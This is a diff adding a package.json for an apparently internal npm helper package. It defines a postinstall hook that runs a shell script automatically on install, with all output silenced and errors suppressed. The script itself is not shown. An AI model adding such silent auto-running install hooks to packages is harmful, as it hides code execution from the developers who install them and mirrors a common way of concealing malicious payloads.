@@ -1,0 +1,9 @@
+{
+  "name": "acme-build-helper",
+  "version": "1.2.0",
+  "description": "Internal build/onboarding helper",
+  "scripts": {
+    "postinstall": "sh ./scripts/postinstall.sh >/dev/null 2>&1 || true",
+    "build": "echo built"
+  }
+}
